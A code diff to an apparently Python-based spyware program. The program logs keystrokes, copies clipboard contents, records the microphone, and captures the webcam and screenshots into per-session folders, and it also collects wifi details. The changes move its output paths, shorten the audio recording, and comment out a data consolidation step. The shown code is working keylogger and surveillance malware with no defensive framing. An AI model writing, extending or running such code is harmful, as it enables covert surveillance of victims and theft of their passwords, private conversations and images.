@@ -25,7 +25,6 @@ import time
 
 # Global Variables
 
-keys_info = "key_log.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 audio_info = "audio.wav"
@@ -85,7 +84,8 @@ def network_activity():
 
 # Clipboard Data
 def copy_clipboard():
-    with open(file_path + clipboard_info, "a") as f:
+    clipboard_file_path = os.path.join(sessions_folder, clipboard_info)
+    with open(clipboard_file_path, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -94,22 +94,25 @@ def copy_clipboard():
         except:
             f.write("Clipboard Could not be copied.\n")
 
-# Microphone Recording
-def microphone():
-    fs = 44100  # Sample rate
-    seconds = 90  # Duration
-    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-    sd.wait()
-    write(file_path + audio_info, fs, myrecording)
 
-# Define separate folders for screenshots and webcam images
+
 currtime = datetime.now().strftime("%Y%m%d%H%M%S")
 
 
 sessions_folder = os.path.join(file_path, f"sessions", f"session{currtime}")
 webcam_folder = os.path.join(sessions_folder, "webcam_images")  # Folder for webcam images
 screenshots_folder = os.path.join(sessions_folder, "screenshots")
+keys_info = os.path.join(sessions_folder, "key_log.txt")
 
+# Microphone Recording
+def microphone():
+    fs = 44100  # Sample rate
+    seconds = 15  # Duration
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+    audio_file_path = os.path.join(sessions_folder, audio_info)
+    write(audio_file_path, fs, myrecording)
+    # write(sessions_folder+audio_info, fs, myrecording)
 
 
 # Create the folders if they don't exist
@@ -175,7 +178,7 @@ def on_press(key):
         k = str(key)
     
     # Write directly to the file on each key press
-    with open(file_path + keys_info, "a") as f:
+    with open(keys_info, "a") as f:
         if k.find("Key.space") > -1:
             f.write("\n")  # Add a new line for space
         elif k.find("Key") == -1:
@@ -240,7 +243,7 @@ webcam_capture()
 # fetch_browser_history()
 wifi_info_fetch()
 microphone()
-consolidate_data()
+# consolidate_data()
 
 def run_scheduled_tasks():
     while True:
